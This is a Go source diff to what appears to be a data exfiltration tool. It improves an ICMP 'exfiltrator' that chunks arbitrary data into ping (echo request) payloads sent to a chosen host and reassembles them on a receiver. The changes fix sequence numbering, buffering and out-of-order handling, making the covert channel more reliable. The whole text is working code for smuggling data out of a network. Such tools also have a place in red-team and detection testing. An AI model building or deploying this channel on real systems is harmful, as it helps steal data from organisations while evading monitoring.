@@ -4,7 +4,6 @@ import (
 	crand "crypto/rand"
 	"fmt"
 	"io"
-	"log"
 	mrand "math/rand"
 
 	"net"
@@ -16,6 +15,7 @@ import (
 const (
 	ICMP_EXFILTRATOR_CHUNK_SIZE = 64
 	ICMP_INITIAL_SEQ            = 1
+	BUFFER_SIZE                 = 1500
 )
 
 type ICMP struct {
@@ -50,7 +50,7 @@ func (e *ICMP) Exfiltrate(data io.Reader, to string) error {
 			Type: ipv4.ICMPTypeEcho,
 			Body: &icmp.Echo{
 				ID:   1,
-				Seq:  1,
+				Seq:  e.currentSeq,
 				Data: bytes[:n],
 			},
 		}
@@ -73,7 +73,7 @@ func (e *ICMP) Exfiltrate(data io.Reader, to string) error {
 		e.currentSeq++
 	}
 
-	// Send end of transfer using (current sequence number + 2) and random amount of bytes
+	// Send end-of-transfer using (current sequence number + 2) and random amount of bytes
 	n := mrand.Intn(ICMP_EXFILTRATOR_CHUNK_SIZE)
 	endData := make([]byte, n)
 	crand.Read(endData)
@@ -107,31 +107,35 @@ func (e *ICMP) Receive(output io.Writer) error {
 	}
 	defer conn.Close()
 
-	bytes := make([]byte, ICMP_EXFILTRATOR_CHUNK_SIZE)
+	bytes := make([]byte, BUFFER_SIZE)
+	expectedSeq := ICMP_INITIAL_SEQ
 
 	for {
-		_, _, err := conn.ReadFrom(bytes)
+		n, _, err := conn.ReadFrom(bytes)
 		if err == io.EOF {
 			return nil
 		} else if err != nil {
 			return err
 		}
 
-		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), bytes)
+		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), bytes[:n])
 		if err != nil {
-			return err
+			continue
 		}
 
 		if msg.Type == ipv4.ICMPTypeEcho {
 			echo := msg.Body.(*icmp.Echo)
-			// Check if the sequence number is the current sequence number + 2, which is the end of transfer
-			if echo.Seq == e.currentSeq+2 {
-				log.Println("End of transfer")
+
+			// Check for end-of-transfer
+			if echo.Seq == expectedSeq+2 {
 				return nil
 			}
-			output.Write(echo.Data)
-			e.currentSeq++
-		}
 
+			// Only writes data if the sequence number is the expected sequence number
+			if echo.Seq == expectedSeq {
+				output.Write(echo.Data)
+				expectedSeq++
+			}
+		}
 	}
 }
